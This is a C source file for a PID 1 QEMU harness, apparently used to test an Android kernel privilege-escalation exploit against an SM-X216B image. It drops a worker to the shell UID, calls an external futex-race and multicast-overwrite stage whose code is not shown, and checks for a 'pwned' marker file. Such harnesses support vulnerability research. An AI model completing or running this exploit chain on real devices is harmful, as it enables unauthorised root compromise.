#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/sysmacros.h>
#include <fcntl.h>
#include <errno.h>

extern int trigger_futex_race(void);
extern int phase2_bridge_diag(void);

static void run_worker_payload(void) {
    /* 1. Drop privileges to Android shell user (UID 2000, GID 2000) */
    if (setresgid(2000, 2000, 2000) != 0) {
        printf("[CHILD] setresgid(2000) failed errno=%d\n", errno);
    }
    if (setresuid(2000, 2000, 2000) != 0) {
        printf("[CHILD] setresuid(2000) failed errno=%d\n", errno);
    }

    printf("[WORKER] Running as UID: %d, EUID: %d, GID: %d\n",
           (int)getuid(), (int)geteuid(), (int)getgid());
    fflush(stdout);

    /* 2. Stage 1 — Futex race & IPv4 MCAST overwrite */
    printf("[*] Stage 1 — futex race (IPv4 MCAST_BLOCK_SOURCE stamp)...\n");
    fflush(stdout);
    int race_res = trigger_futex_race();
    printf("[RESULT] Stage 1 diagnostic result: %d\n", race_res);
    if (race_res == 2) {
        printf("\n[*] Stage 2 — reference bridge prerequisite check...\n");
        int phase2_res = phase2_bridge_diag();
        printf("[RESULT] Stage 2 prerequisite result: %d\n", phase2_res);
        printf("[INFO] Root effect skipped: bridge/marker proof is still missing.\n");
        printf("[RESULT] Final UID: %d, EUID: %d, GID: %d\n",
               (int)getuid(), (int)geteuid(), (int)getgid());
        fflush(stdout);
        _exit(phase2_res ? phase2_res : race_res);
    }
    if (race_res != 0) {
        printf("[INFO] Stage 2 skipped: Stage 1 order did not match the reference gates.\n");
        printf("[RESULT] Final UID: %d, EUID: %d, GID: %d\n",
               (int)getuid(), (int)geteuid(), (int)getgid());
        fflush(stdout);
        _exit(race_res);
    }
}

int main(void) {
    /* Ensure unbuffered output for clean serial logging */
    setvbuf(stdout, NULL, _IONBF, 0);

    /* Check if already spawned as PID > 1 or child */
    if (getpid() != 1) {
        run_worker_payload();
        return 0;
    }

    /* =========================================================================
     * PID 1 Host Harness (A17 / GhostLock style)
     * ========================================================================= */
    printf("==========================================\n");
    printf("  SM-X216B QEMU Harness (A17 Style)       \n");
    printf("==========================================\n");

    /* Mount pseudo-filesystems */
    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);

    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);

    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);

    mkdir("/data", 0755);
    mount("tmpfs", "/data", "tmpfs", 0, NULL);
    mkdir("/data/local", 0755);
    mkdir("/data/local/tmp", 0777);

    /* Device nodes fallback */
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));
    mknod("/dev/zero", S_IFCHR | 0666, makedev(1, 5));
    mknod("/dev/ptmx", S_IFCHR | 0666, makedev(5, 2));

    /* Resolve ashmem minor from /proc/misc */
    FILE *f = fopen("/proc/misc", "r");
    int minor = -1, m;
    char name[64];
    if (f) {
        while (fscanf(f, "%d %63s", &m, name) == 2) {
            if (strcmp(name, "ashmem") == 0) { minor = m; break; }
        }
        fclose(f);
    }
    if (minor >= 0) {
        mknod("/dev/ashmem", S_IFCHR | 0666, makedev(10, minor));
        chmod("/dev/ashmem", 0666);
    }

    printf("[INIT] PID 1 booted. Forking UID 2000 worker...\n");
    fflush(stdout);

    pid_t worker_pid = fork();
    if (worker_pid == 0) {
        run_worker_payload();
        _exit(0);
    }

    int status = 0;
    waitpid(worker_pid, &status, 0);

    if (WIFEXITED(status)) {
        printf("[INIT] Worker exited with code: %d\n", WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
        printf("[INIT] Worker killed by signal: %d\n", WTERMSIG(status));
    }

    /* Check output marker */
    int mfd = open("/data/local/tmp/pwned", O_RDONLY);
    if (mfd >= 0) {
        char buf[64] = {0};
        read(mfd, buf, sizeof(buf) - 1);
        close(mfd);
        printf("[INIT] Output marker: %s", buf);
    }

    printf("[INIT] Test complete. PID 1 parking.\n");
    fflush(stdout);

    /*
     * Keep PID 1 alive indefinitely (iQOO / A17 pattern)
     * Never exit PID 1 to prevent "Attempted to kill init!" kernel panic
     */
    for (;;) {
        pause();
    }

    return 0;
}
